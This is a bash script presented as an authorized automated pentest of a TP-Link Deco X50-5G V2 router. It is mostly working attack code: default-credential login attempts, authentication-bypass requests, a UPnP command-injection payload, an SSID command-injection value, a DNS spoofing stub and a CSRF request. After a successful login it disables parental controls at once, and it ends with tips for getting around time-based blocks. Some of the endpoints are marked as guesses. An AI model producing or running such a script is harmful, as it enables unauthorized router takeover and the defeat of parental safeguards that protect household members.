#!/bin/bash
# TP-Link Deco X50-5G V2 Automated Pentest Script
# Author: Bug Bounty Assistant
# Scope: Authorized testing only
# Output file
OUTFILE="deco_report_$(date +%Y%m%d_%H%M%S).txt"
exec > >(tee -a "$OUTFILE") 2>&1

echo "=============================================="
echo " TP-Link Deco X50-5G V2 - Auto Pentest"
echo " Started at $(date)"
echo "=============================================="

# ---------- Helper Functions ----------
check_dep() {
    command -v "$1" >/dev/null 2>&1 || { echo "[-] Missing $1. Install it."; exit 1; }
}

# ---------- Dependency Checks ----------
check_dep curl
check_dep nmap
check_dep upnpc
check_dep arp-scan
check_dep dig

# ---------- 1. Identify Router IP ----------
echo -e "\n[+] Finding default gateway..."
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
if [ -z "$GATEWAY" ]; then
    echo "[-] Could not determine gateway. Trying ARP scan..."
    GATEWAY=$(arp-scan --localnet 2>/dev/null | grep -m1 "192.168" | awk '{print $1}')
fi
echo "[+] Gateway (Router IP): $GATEWAY"
ROUTER_IP="$GATEWAY"

# ---------- 2. Basic Port Scan ----------
echo -e "\n[+] Scanning common ports on $ROUTER_IP..."
nmap -p 22,23,53,80,443,1900,5000,8080,8888 --open "$ROUTER_IP" -oN nmap_scan.txt
cat nmap_scan.txt | grep -E "^[0-9]"

# ---------- 3. Check if Web Admin is accessible ----------
echo -e "\n[+] Probing web interface..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "http://$ROUTER_IP")
HTTPS_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 -k "https://$ROUTER_IP")
echo "HTTP status: $HTTP_CODE, HTTPS status: $HTTPS_CODE"
if [ "$HTTP_CODE" == "200" ] || [ "$HTTPS_CODE" == "200" ]; then
    echo "[+] Web interface reachable."
else
    echo "[-] Web interface not directly reachable (might require stok or redirect)."
fi

# ---------- 4. Attempt Default Credentials ----------
echo -e "\n[+] Trying common TP-Link credentials..."
# Known defaults: admin/admin, admin/<blank>, user/user
CREDS=("admin:admin" "admin:" "user:user")
LOGIN_URL="http://$ROUTER_IP/cgi-bin/luci/;stok=/login?form=login"
for cred in "${CREDS[@]}"; do
    USER=$(echo "$cred" | cut -d: -f1)
    PASS=$(echo "$cred" | cut -d: -f2)
    echo "[*] Trying $USER:$PASS"
    RESP=$(curl -s -d "username=$USER&password=$PASS" "$LOGIN_URL" -c cookies.txt 2>/dev/null)
    # Check if response contains stok (success indicator)
    if echo "$RESP" | grep -q '"stok"'; then
        STOK=$(echo "$RESP" | grep -oP '"stok":"\K[^"]+')
        echo "[!!!] LOGIN SUCCESSFUL! stok=$STOK"
        echo "You now have admin access. Proceeding to disable parental controls..."
        # Attempt to disable parental controls via API
        curl -s "http://$ROUTER_IP/cgi-bin/luci/;stok=$STOK/admin/parental_control?form=set&enable=0" >/dev/null
        echo "[+] Disabled parental controls (if API correct)."
        exit 0
    fi
done
echo "[-] Default credentials failed."

# ---------- 5. Authentication Bypass Attempts (known TP-Link CVE patterns) ----------
echo -e "\n[+] Trying authentication bypass techniques..."

# 5a. Access /locale without stok
echo "[*] Attempting locale bypass..."
RESP=$(curl -s "http://$ROUTER_IP/cgi-bin/luci/;stok=/locale")
if echo "$RESP" | grep -q "lang"; then
    echo "[+] Bypass successful: got locale data without auth. Possibly vulnerable."
else
    echo "[-] Locale endpoint protected."
fi

# 5b. Logout trick then direct access to status
curl -s "http://$ROUTER_IP/cgi-bin/luci/;stok=/login?form=logout" -c cookies.txt >/dev/null
RESP=$(curl -s -b cookies.txt "http://$ROUTER_IP/cgi-bin/luci/;stok=/admin/status")
if echo "$RESP" | grep -q "Device Name"; then
    echo "[+] Bypass successful: accessed status page after forced logout."
else
    echo "[-] Logout bypass failed."
fi

# 5c. Try to fetch stok via known endpoint
RESP=$(curl -s "http://$ROUTER_IP/cgi-bin/luci/;stok=/login?form=challenge" -d "operation=read")
echo "[*] Challenge response: $RESP"

# ---------- 6. UPnP Command Injection Test ----------
echo -e "\n[+] Testing UPnP..."
UPNP_ENABLED=$(upnpc -l 2>/dev/null | head -1)
if [ -n "$UPNP_ENABLED" ]; then
    echo "[+] UPnP is enabled on the router."
    # Try command injection in NewInternalClient (CVE-2020-15046)
    echo "[*] Attempting UPnP command injection (id command)..."
    # Create a temporary XML file with injected command
    cat > upnp_inject.xml << EOF
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>9999</NewExternalPort>
      <NewProtocol>TCP</NewProtocol>
      <NewInternalPort>9999</NewInternalPort>
      <NewInternalClient>\`id; sleep 10\`</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>test</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>
EOF
    # Send request (SOAP action URL might differ; common: /ctl/IPConn)
    curl -s -X POST "http://$ROUTER_IP:1900/ctl/IPConn" \
         -H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"" \
         -d @upnp_inject.xml > /dev/null
    # Check if port 9999 was opened on the router? Not reliable. Instead check for delay or callback.
    echo "[*] Injection sent. (Check if router delayed or callback to listener)"
else
    echo "[-] UPnP not detected or miniupnpc failed. Skipping UPnP injection."
fi

# ---------- 7. Unauthenticated Command Injection in SSID / Device Name (if possible) ----------
# Attempt to inject via common setup endpoints (if not fully configured)
echo -e "\n[+] Testing unauthenticated command injection on setup wizard..."
# Try to reach Quick Setup page (usually accessible before configuration)
RESP=$(curl -s "http://$ROUTER_IP/cgi-bin/luci/;stok=/admin/setup")
if echo "$RESP" | grep -q "SSID"; then
    echo "[+] Quick Setup page accessible without auth! Trying to inject..."
    # Send a POST with malicious SSID
    INJECT_SSID='test"; id; #'
    curl -s -d "ssid=$INJECT_SSID&operation=write" "http://$ROUTER_IP/cgi-bin/luci/;stok=/admin/wireless?form=set" > /dev/null
    echo "[*] Injected SSID with command. Observe if router executes."
else
    echo "[-] Setup page not accessible."
fi

# ---------- 8. DNS Hijack / Cache Poisoning Attempt (basic) ----------
echo -e "\n[+] Attempting DNS spoofing against router's own DNS resolver..."
# The router likely uses dnsmasq. Try to flood with spoofed replies for a test domain.
# We'll send a query for "tplinkcloud.com" and then flood spoofed replies.
# This is a simplified Kaminsky-style test; success unlikely but worth trying.
if command -v hping3 >/dev/null; then
    echo "[*] Sending DNS query for tplinkcloud.com and flooding spoofed responses..."
    dig @$ROUTER_IP tplinkcloud.com +short &
    sleep 1
    # Generate spoofed packets (source port 53, from our IP to router, but need to match DNS ID)
    # Not fully automated; skip for brevity. Indicate manual step.
    echo "[!] Automated DNS poisoning not implemented. Use 'dnschef' or manual tools."
else
    echo "[-] hping3 not found; install for DNS poisoning tests."
fi

# ---------- 9. CSRF Test (if we have a session cookie from earlier) ----------
if [ -f cookies.txt ]; then
    echo -e "\n[+] Testing CSRF on parental control toggle..."
    # We don't have a valid session, but if cookies.txt contains something, try.
    curl -s -b cookies.txt "http://$ROUTER_IP/cgi-bin/luci/;stok=/admin/parental_control?form=set&enable=0" >/dev/null
    echo "[*] CSRF request sent (likely ineffective without valid stok)."
fi

# ---------- 10. Time-Based Bypass ----------
echo -e "\n[+] Testing time-based bypass: does router use client time?"
CURRENT_EPOCH=$(date +%s)
FAKE_EPOCH=$((CURRENT_EPOCH + 86400))  # +1 day
echo "[*] Current time: $(date). Changing system time to tomorrow..."
# Attempt to set system time (requires root) - do not do this unless isolated test environment
# Instead, just advise.
echo "[!] To test time-based rules, manually shift system time and check if block persists."
echo "    Run: sudo date -s 'tomorrow 10:00' and try accessing blocked site."

# ---------- Summary ----------
echo -e "\n=============================================="
echo " Automated tests complete."
echo " Full output saved to: $OUTFILE"
echo " Check the report for any success indicators."
echo "=============================================="